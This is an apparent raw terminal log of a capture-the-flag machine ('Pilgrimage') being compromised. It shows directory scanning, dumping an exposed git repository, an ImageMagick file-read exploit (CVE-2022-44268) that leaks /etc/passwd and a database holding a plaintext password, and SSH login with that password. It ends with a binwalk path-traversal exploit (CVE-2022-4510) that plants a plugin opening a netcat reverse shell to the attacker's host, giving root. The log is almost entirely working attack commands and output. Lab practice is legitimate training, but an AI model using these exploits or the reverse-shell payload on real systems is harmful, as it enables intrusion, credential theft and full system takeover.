└─$ sudo dirsearch -u http://pilgrimage.htb/
[sudo] password for ed: 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/ed/reports/http_pilgrimage.htb/__26-06-26_10-31-59.txt

Target: http://pilgrimage.htb/

[10:31:59] Starting: 
[10:32:03] 301 -  169B  - /.git  ->  http://pilgrimage.htb/.git/
[10:32:03] 403 -  555B  - /.git/
[10:32:03] 403 -  555B  - /.git/branches/
[10:32:03] 200 -   92B  - /.git/config
[10:32:03] 200 -    2KB - /.git/COMMIT_EDITMSG
[10:32:03] 200 -   23B  - /.git/HEAD
[10:32:03] 200 -   73B  - /.git/description
[10:32:03] 403 -  555B  - /.git/hooks/
[10:32:03] 403 -  555B  - /.git/info/
[10:32:03] 200 -    4KB - /.git/index
[10:32:03] 200 -  240B  - /.git/info/exclude
[10:32:03] 403 -  555B  - /.git/logs/
[10:32:03] 200 -  195B  - /.git/logs/HEAD
[10:32:03] 301 -  169B  - /.git/logs/refs  ->  http://pilgrimage.htb/.git/logs/refs/
[10:32:03] 301 -  169B  - /.git/logs/refs/heads  ->  http://pilgrimage.htb/.git/logs/refs/heads/
[10:32:03] 200 -  195B  - /.git/logs/refs/heads/master
[10:32:03] 403 -  555B  - /.git/objects/
[10:32:03] 403 -  555B  - /.git/refs/
[10:32:03] 301 -  169B  - /.git/refs/heads  ->  http://pilgrimage.htb/.git/refs/heads/
[10:32:03] 200 -   41B  - /.git/refs/heads/master
[10:32:03] 301 -  169B  - /.git/refs/tags  ->  http://pilgrimage.htb/.git/refs/tags/
[10:32:03] 403 -  555B  - /.ht_wsr.txt
[10:32:03] 403 -  555B  - /.htaccess.bak1
[10:32:03] 403 -  555B  - /.htaccess.orig
[10:32:03] 403 -  555B  - /.htaccess.save
[10:32:03] 403 -  555B  - /.htaccess_sc
[10:32:03] 403 -  555B  - /.htaccess_extra
[10:32:03] 403 -  555B  - /.htaccess.sample
[10:32:03] 403 -  555B  - /.htaccess_orig
[10:32:03] 403 -  555B  - /.htaccessOLD
[10:32:03] 403 -  555B  - /.htaccessOLD2
[10:32:03] 403 -  555B  - /.htaccessBAK
[10:32:03] 403 -  555B  - /.html
[10:32:03] 403 -  555B  - /.htm
[10:32:03] 403 -  555B  - /.htpasswd_test
[10:32:03] 403 -  555B  - /.httr-oauth
[10:32:03] 403 -  555B  - /.htpasswds
[10:32:23] 301 -  169B  - /assets  ->  http://pilgrimage.htb/assets/
[10:32:23] 403 -  555B  - /assets/
[10:32:30] 302 -    0B  - /dashboard.php  ->  /login.php
[10:32:44] 200 -    6KB - /login.php
[10:32:44] 302 -    0B  - /logout.php  ->  /
[10:32:57] 200 -    6KB - /register.php
[10:33:07] 301 -  169B  - /tmp  ->  http://pilgrimage.htb/tmp/


./gitdumper.sh http://pilgrimage.htb/.git/ dest-dir ~/oscptest/prlg.htb/
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating dest-dir/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs


─$ ./extractor.sh ~/oscptest/pilg.htb/dest-dir/ ~/oscptest/pilg.htb/ex
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: e1a40beebc7035212efdcb15476f9c994e3634a7
[+] Found folder: /home/ed/oscptest/pilg.htb/ex/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets
[+] Found file: /home/ed/oscptest/pilg.htb/ex/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/bulletproof.php



└─$ cat commit-meta.txt 
tree f3e708fd3c3689d0f437b2140e08997dbaff6212
author emily <emily@pilgrimage.htb> 1686132708 +1000
committer root <root@pilgrimage.htb> 1686132708 +1000

Pilgrimage image shrinking service initial commit.


└─$ cat login.php 
<?php
session_start();
if(isset($_SESSION['user'])) {
  header("Location: /dashboard.php");
  exit(0);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['password']) {
  $username = $_POST['username'];
  $password = $_POST['password'];

  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");
  $stmt->execute(array($username,$password));

  if($stmt->fetchAll()) {
    $_SESSION['user'] = $username;
    header("Location: /dashboard.php");
  }
  else {
    header("Location: /login.php?message=Login failed&status=fail");
  }
}


https://github.com/entr0pie/CVE-2022-44268

http://pilgrimage.htb/?message=http://pilgrimage.htb/shrunk/6a3e05b2b802b.png&status=success


python3 CVE-2022-44268.py /etc/passwd  # Create output.png

http://pilgrimage.htb/shrunk/6a3e05b2b802b.png


└─$ ~/oscptest/pilg.htb/ex/0-e1a40beebc7035212efdcb15476f9c994e3634a7/magick identify -verbose 6a3e05b2b802b.png > out
                                                                                                              
┌──(ed㉿kali)-[~/oscptest/pilg.htb/CVE-2022-44268]
└─$ cat out            
Image:
  Filename: 6a3e05b2b802b.png
  Format: PNG (Portable Network Graphics)
  Mime type: image/png
  Class: PseudoClass
  Geometry: 128x1+0+0
  Units: Undefined
  Colorspace: Gray
  Type: Grayscale
  Base type: Undefined
  Endianness: Undefined
  Depth: 8-bit
  Channel depth:
    Gray: 8-bit
  Channel statistics:
    Pixels: 128
    Gray:
      min: 1  (0.00392157)
      max: 254 (0.996078)
      mean: 127.984 (0.5019)
      median: 127 (0.498039)
      standard deviation: 74.1888 (0.290937)
      kurtosis: -1.2282
      skewness: -0.00119564
      entropy: 1
  Colors: 128
  Histogram:
             1: (1,1,1) #010101 gray(1)
             1: (2,2,2) #020202 gray(2)
             1: (5,5,5) #050505 gray(5)
             1: (7,7,7) #070707 gray(7)
             1: (9,9,9) #090909 gray(9)
             1: (11,11,11) #0B0B0B gray(11)
             1: (13,13,13) #0D0D0D gray(13)
             1: (15,15,15) #0F0F0F gray(15)
             1: (17,17,17) #111111 gray(17)
             1: (19,19,19) #131313 gray(19)
             1: (21,21,21) #151515 gray(21)
<Snip>...
    255: (255,255,255,1) #FFFFFFFF graya(255,1)
  Rendering intent: Undefined
  Gamma: 0.45455
  Matte color: grey74
  Background color: white
  Border color: srgb(223,223,223)
  Transparent color: none
  Interlace: None
  Intensity: Undefined
  Compose: Over
  Page geometry: 128x1+0+0
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Orientation: Undefined
  Properties:
    date:create: 2026-06-26T04:53:35+00:00
    date:modify: 2026-06-26T04:53:07+00:00
    date:timestamp: 2026-06-26T04:54:39+00:00
    just for test!: 
    png:bKGD: chunk was found (see Background color, above)
    png:gAMA: gamma=0.45455 (See Gamma, above)
    png:IHDR.bit-depth-orig: 8
    png:IHDR.bit_depth: 8
    png:IHDR.color-type-orig: 0
    png:IHDR.color_type: 0 (Grayscale)
    png:IHDR.interlace_method: 0 (Not interlaced)
    png:IHDR.width,height: 128, 1
    png:text: 5 tEXt/zTXt/iTXt chunks were found
    png:tIME: 2026-06-26T04:53:07Z
    Raw profile type: 

    1437
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
<Snip>...




└─$ python3 -c "print(bytes.fromhex('726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f6c616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a'))"
b'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/lache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n

emily:x:1000:1000:emily,,,:/home/emily:/bin/bash\n

systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n_laurel:x:998:998::/var/log/laurel:/bin/false\n'


http://pilgrimage.htb/shrunk/6a3e078666234.png

└─$ wget http://pilgrimage.htb/shrunk/6a3e078666234.png
--2026-06-26 13:01:09--  http://pilgrimage.htb/shrunk/6a3e078666234.png
Resolving pilgrimage.htb (pilgrimage.htb)... 10.129.6.69
Connecting to pilgrimage.htb (pilgrimage.htb)|10.129.6.69|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 299 [image/png]
Saving to: '6a3e078666234.png'

6a3e078666234.png           100%[=========================================>]     299  --.-KB/s    in 0s      

2026-06-26 13:01:09 (64.7 MB/s) - '6a3e078666234.png' saved [299/299]





└─$ sqlite3 pil.sqlite                                                      
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .databse
Error: unknown command or invalid arguments:  "databse". Enter ".help" for help
sqlite> .databses
Error: unknown command or invalid arguments:  "databses". Enter ".help" for help
sqlite> .database
main: /home/ed/oscptest/pilg.htb/CVE-2022-44268/pil.sqlite r/w
sqlite> .tables
images  users 
sqlite> select * from users;
emily|abigchonkyboi123


└─$ ssh emily@10.129.6.69
uid=1000(emily) gid=1000(emily) groups=1000(emily)



root         699  0.0  0.0   6816  3008 ?        Ss   12:28   0:00 /bin/bash /usr/sbin/malwarescan.sh
root         701  0.0  0.1 220796  6776 ?        Ssl  12:28   0:00 /usr/sbin/rsyslogd -n -iNONE
root         704  0.0  0.1  13852  6980 ?        Ss   12:28   0:00 /lib/systemd/systemd-logind
root         715  0.0  0.6 209752 27652 ?        Ss   12:28   0:01 php-fpm: master process (/etc/php/7.4/fpm/p
root         732  0.0  0.0   2516   712 ?        S    12:28   0:00 /usr/bin/inotifywait -m -e create /var/www/
root         733  0.0  0.0   6816  2292 ?        S    12:28   0:00 /bin/bash /usr/sbin/malwarescan.sh
root         737  0.0  0.1  13352  7416 ?        Ss   12:28   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-
root         744  0.0  0.0   5844  1716 tty1     Ss+  12:28   0:00 /sbin/agetty -o -p -- \u --noclear tty1 lin
root         803  0.0  0.0      0     0 ?        S    12:28   0:00 [hwmon1]

emily@pilgrimage:~$ ls -la /usr/sbin/malwarescan.sh
-rwxr--r-- 1 root root 474 Jun  1  2023 /usr/sbin/malwarescan.sh
emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done

emily@pilgrimage:~$ binwalk 

Binwalk v2.3.2


https://github.com/adhikara13/CVE-2022-4510-WalkingPath

emily@pilgrimage:~$ wget http://10.10.16.25:/walkingpath.py
--2026-06-26 17:47:51--  http://10.10.16.25/walkingpath.py
Connecting to 10.10.16.25:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3391 (3.3K) [text/x-python]
Saving to: 'walkingpath.py'

walkingpath.py              100%[=========================================>]   3.31K  --.-KB/s    in 0.001s  

2026-06-26 17:47:51 (4.49 MB/s) - 'walkingpath.py' saved [3391/3391]

echo "1" > input.png

python3 walkingpath.py command --command "nc 10.10.16.25 8822 -e /bin/bash" input.png

mily@pilgrimage:~$ ls
a.py  binwalk_exploit.png  test.png  user.txt  walkingpath.py
emily@pilgrimage:~$ cat binwalk_exploit.png 
1
PFS/0.9../../../.config/binwalk/plugins/binwalk.py4��.import binwalk.core.plugin

import os

import shutil

class MaliciousExtractor(binwalk.core.plugin.Plugin):

    def init(self):

        if not os.path.exists('/tmp/.binwalk'):

            os.system("nc 10.10.16.25 8822 -e /bin/bash")

            with open('/tmp/.binwalk', 'w') as temp_file:

                temp_file.write('1')

        else:

            os.remove('/tmp/.binwalk')

            os.remove(os.path.abspath(__file__))

            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), '__pycache__'))

cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/


└─$ nc -nvlp 8822
listening on [any] 8822 ...
connect to [10.10.16.25] from (UNKNOWN) [10.129.6.69] 53814
id
uid=0(root) gid=0(root) groups=0(root)
